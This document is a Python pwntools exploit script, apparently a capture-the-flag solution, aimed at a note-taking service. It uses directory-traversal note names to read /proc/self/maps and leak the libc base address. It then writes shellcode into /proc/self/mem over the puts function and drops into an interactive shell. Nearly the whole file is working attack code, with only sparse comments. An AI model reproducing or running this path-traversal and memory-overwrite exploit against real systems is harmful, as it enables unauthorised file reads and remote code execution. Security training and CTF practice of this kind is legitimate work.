from pwn import *

context.arch = 'amd64'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
init_port = sys.argv[1]
# r = process('./share/notepad')
r = remote('10.113.184.121', init_port)

def Login(username, password):
    r.recvuntil('> ')
    r.sendline('1')
    r.recvuntil('Username: ')
    r.sendline(username)
    r.recvuntil('Password: ')
    r.sendline(password)

def Register(username, password):
    r.recvuntil('> ')
    r.sendline('2')
    r.recvuntil('Username: ')
    r.sendline(username)
    r.recvuntil('Password: ')
    r.sendline(password)
    
def NewNote(note_name, content_length, content):
    r.recvuntil('> ')
    r.sendline('3')
    r.sendlineafter('Note Name: ', note_name)
    r.sendlineafter('Content Length: ', content_length)
    r.sendlineafter('Content: ', content)
    
def EditNoteName(name, offset, length, content):
    r.recvuntil('> ')
    r.sendline('4')
    r.sendlineafter('Note Name: ', name)
    r.sendlineafter('Offset: ', offset)
    r.sendlineafter('Content Length: ', length)
    r.sendlineafter('Content: ', content)

def ShowNote(note_name, offset):
    r.recvuntil('> ')
    r.sendline('5')
    r.sendlineafter('Note Name: ', note_name)
    r.sendlineafter('Offset: ', offset)
    res = r.recv(128).decode().strip()
    return res

def read_file(file_name):
    payload = b'../../../' + b'./' * (48 - len(file_name) // 2) + b'/' + file_name
    print(len(payload))
    ret = ''
    offset = 0
    while(True):
        res = ShowNote(payload, str(offset).encode())
        # print("map_layout :" + res, "len: " + str(len(res)))
        if res != 'Read note failed.' and res != "Couldn't open the file.":
            ret += res
            offset += 128
        else:
            if offset == 0:
                print("Failed!!!")
            else:
                print("Success!!!")
            break
    return ret

def extract_libc_base(maps_layout):
    # Iterate over each entry in the maps layout
    for entry in maps_layout:
        # Check if the entry contains the path to libc
        if '/usr/lib/x86_64-linux-gnu/libc.so.6' in entry:
            # The base address is the part before the '-' in the entry
            base_address_str = entry.split('-')[0]
            # Convert the base address from a string to an integer
            libc_base_address = int(base_address_str, 16)
            return libc_base_address
    # If not found, return None or raise an error
    return None

# Register and Login
Register('admin', 'admin')
Login('admin', 'admin')
# file_path = b'../../../' + b'./' * (48 - len(b'/proc/self/mem') // 2) + b'/' + b'/proc/self/maps'
# maps_layout = ShowNote(file_path, '0')
# print("Maps_Content: "+ maps_layout, "len: " + str(len(maps_layout)))

# read /proc/self/maps to get libc base
maps_layout = read_file(b'/proc/self/maps').split('\n')
print(f'maps_layout: {maps_layout}')
libc_base = extract_libc_base(maps_layout)
print(f'libc_base: {hex(libc_base)}')
puts_address = libc_base + libc.symbols['puts']
print(f'puts_address: {hex(puts_address)}')

# write to proc/self/mem to overwrite puts@got
file_path = b'../../../' + b'./' * (49 - len(b'/proc/self/mem') // 2) + b'/proc/self/mem'
print(len(file_path))

with open('shellcode.bin', 'rb') as f:
    shellcode = f.read()
    print(shellcode)
EditNoteName(file_path, str(puts_address).encode(), str(len(shellcode)).encode(), shellcode)

r.interactive()